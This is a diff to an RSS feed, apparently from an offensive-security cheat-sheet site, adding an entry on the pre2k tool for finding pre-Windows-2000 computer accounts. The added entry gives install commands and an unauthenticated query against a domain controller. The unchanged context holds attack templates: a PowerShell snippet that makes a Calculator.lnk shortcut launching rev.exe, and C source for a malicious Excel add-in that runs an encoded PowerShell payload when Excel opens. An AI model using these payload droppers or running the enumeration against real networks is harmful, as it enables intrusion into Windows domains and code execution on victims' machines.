@@ -359,6 +359,13 @@
       <description>lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
     </item>
     <item>
+      <title>Pre-Windows 2000 Computer</title>
+      <link>https://tldrbins.github.io/pre-windows_2000_computer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pre-windows_2000_computer/</guid>
+      <description>Enum pre2k Installation python3 -m venv venv source venv/bin/activate git clone https://github.com/garrettfoster13/pre2k.git cd pre2k/ pip3 install . Query # Unauth pre2k unauth -d &amp;#39;&amp;lt;DOMAIN&amp;gt;&amp;#39; -dc-ip &amp;#39;&amp;lt;DC_IP&amp;gt;&amp;#39; -verbose -inputfile &amp;#39;&amp;lt;MACHINES_FILE&amp;gt;&amp;#39; $ cat machines.txt banking$ $ pre2k unauth -d example.com -dc-ip 192.168.1.10 -verbose -inputfile &amp;#39;machines.txt&amp;#39; ___ __ /&amp;#39;___`\ /\ \ _____ _ __ __ /\_\ /\ \\ \ \/&amp;#39;\ /\ &amp;#39;__`\/\`&amp;#39;__\/&amp;#39;__`\ _______\/_/// /__\ \ , &amp;lt; \ \ \L\ \ \ \//\ __//\______\ // /_\ \\ \ \\`\ \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\ \ \ \/ \/_/ \/____/ \/_____/ \/_/\/_/ \ \_\ v3.</description>
+    </item>
+    <item>
       <title>RBCD Attack</title>
       <link>https://tldrbins.github.io/rbcd/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
